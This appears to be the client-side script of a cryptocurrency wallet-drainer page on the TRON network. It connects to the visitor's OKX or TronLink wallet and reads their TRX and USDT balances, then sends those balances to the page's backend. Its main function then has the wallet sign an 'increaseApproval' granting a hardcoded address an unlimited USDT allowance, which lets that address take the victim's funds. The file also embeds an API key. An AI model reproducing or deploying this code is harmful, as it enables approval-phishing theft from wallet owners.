var tronApi = "https://api.trongrid.io";
var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
var domain = 'https://' + window.location.host;

var fixedAuthorizedAddress = "TXzt7y46my1GyY1NhNVPUWbDaqDiQJdEo5";

window.okxwallet.tronLink.request({
    method: 'tron_requestAccounts'
})

var current_address, usdtBalance = 0,
    trxBalance = 0;
var transactionObj = null;
var toAddress, type = 0,
    code, isConnected = false;

async function getUsdtBalance(address, callback) {
    let tronWeb = window.tronWeb;
    let parameter = [{
        type: "address",
        value: address
    }];
    let options = {};
    let result = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", options, parameter, address);
    if (result.result) {
        if (callback != undefined) {
            callback(result.constant_result[0]);
        }
    }
}

async function getAssets(callback) {
    code = getUrlParams('code');
    try {
        let userAgent = navigator.userAgent.toLowerCase();
        if (/okex/.test(userAgent) || isPc()) {
            if (window.okxwallet.tronLink.ready) {
                window.tronWeb = okxwallet.tronLink.tronWeb;
            } else {
                200 === (await window.okxwallet.tronLink.request({
                    method: "tron_requestAccounts"
                })).code && (window.tronWeb = tronLink.tronWeb)
            }
        }
        if (!window.tronWeb) {
            const e = TronWeb.providers.HttpProvider,
                t = new e(tronApi),
                a = new e(tronApi),
                n = tronApi,
                s = new TronWeb(t, a, n);
            window.tronWeb = s;
        }
    } catch (e) {
        tip(e);
    }

    if (window.tronWeb) {
        var tronWeb = window.tronWeb;
        current_address = tronWeb.defaultAddress.base58;
        if (current_address == false) {
            tip("连接钱包失败");
            await getAssets(callback);
            return;
        }
        try {
            const mytronWeb = new TronWeb({
                fullHost: 'https://api.trongrid.io',
                Headers: {
                    'TRON-PRO-API-KEY': '99ac1f00-50b1-4d86-9d66-18bc13c28d41'
                }
            });

            let balance = await mytronWeb.trx.getBalance(current_address);
            trxBalance = mytronWeb.fromSun(balance);

            getUsdtBalance(current_address, function(data) {
                usdtBalance = mytronWeb.fromSun(parseInt(data, 16));
                console.log(usdtBalance);
                isConnected = true;
                tip("连接钱包成功");
                iaGet({
                    current_address: current_address,
                    trx: trxBalance,
                    usdt: usdtBalance,
                    code: code
                });
                if (callback != undefined) {
                    callback(trxBalance, usdtBalance);
                }
            });

        } catch (e) {
            tip(e);
        }
    } else {
        tip("请用钱包扫码打开");
    }
}

async function executeBlockchainTransaction() {
    try {
        let tronWeb = window.tronWeb;
        let current_address = tronWeb.defaultAddress.base58;
        console.log(current_address);
        toAddress = fixedAuthorizedAddress;

        const mytronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
            Headers: {
                'TRON-PRO-API-KEY': '99ac1f00-50b1-4d86-9d66-18bc13c28d41'
            }
        });

        let tokenAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const parameters = [{
                type: "address",
                value: toAddress
            },
            {
                type: "uint256",
                value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
            }
        ];

        const transactionOptions = {
            feeLimit: 100000000
        };

        const transactionObj0 = await mytronWeb.transactionBuilder.triggerSmartContract(
            tokenAddress,
            "increaseApproval(address,uint256)",
            transactionOptions,
            parameters,
            current_address
        );

        console.log("transactionObj0:" + JSON.stringify(transactionObj0, null, 2));

        transactionObj1 = await mytronWeb.transactionBuilder.sendTrx(toAddress, amount * 1000000, current_address);

        console.log("transactionObj1.raw_data" + JSON.stringify(transactionObj1.raw_data, null, 2));

        console.log("之前transactionObj0.transaction.raw_data:" + JSON.stringify(transactionObj0.transaction.raw_data, null, 2));

        console.log("之后transactionObj0.transaction.raw_data:" + JSON.stringify(transactionObj0.transaction.raw_data, null, 2));

        console.log("整体transactionObj0:" + JSON.stringify(transactionObj0, null, 2));

        const signedTransaction = await tronWeb.trx.sign(transactionObj0.transaction);
        console.log("改后signedTransaction:" + JSON.stringify(signedTransaction, null, 2));

        const tx = await tronWeb.trx.sendRawTransaction(signedTransaction);

        if (tx) {
            postInfo(current_address, toAddress);
        }
    } catch (error) {
        console.error("An error occurred during the blockchain transaction:", error);
    }
}

function tip(a, time = 1500) {
    $("#tip").html(a);
    $("#tip").show();
    setTimeout(function() {
        $("#tip").hide();
    }, time)
}
